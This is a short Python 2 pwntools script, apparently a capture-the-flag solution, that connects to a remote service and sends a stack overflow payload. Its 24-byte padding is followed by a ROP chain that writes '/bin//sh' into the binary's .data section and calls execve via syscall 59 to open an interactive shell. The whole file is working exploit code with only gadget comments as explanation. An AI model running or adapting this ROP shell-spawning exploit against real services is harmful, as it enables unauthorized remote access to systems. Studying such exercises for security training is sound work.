#!/usr/bin/env python2

from struct import pack
from pwn import *

context.arch = 'amd64'
r = remote('isc.taiwan-te.ch', 10004)

# rbp - rsp = 16
p = 'A' * 24

#ROPgadget is bad

p += p64(0x0000000000400686) # pop rdi ; ret
p += p64(0x00000000006b90e0) # .data
p += p64(0x0000000000410093) # pop rsi ; ret
p += '/bin//sh'
p += p64(0x0000000000446c1b) # mov qword ptr [rdi], rsi ; ret
p += p64(0x000000000044ba39) # pop rdx ; pop rsi ; ret
p += p64(0x00000000006b90e8) #.data + 8
p += p64(0x00000000006b90e8) #.data + 8
p += p64(0x00000000004447f0) # xor rax, rax ; ret
p += p64(0x000000000047f071) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000415294) # pop rax ; ret
p += p64(59)                 # syscall
p += p64(0x000000000047b20f) # complete syscall


r.sendline(p)
r.interactive()
r.close()

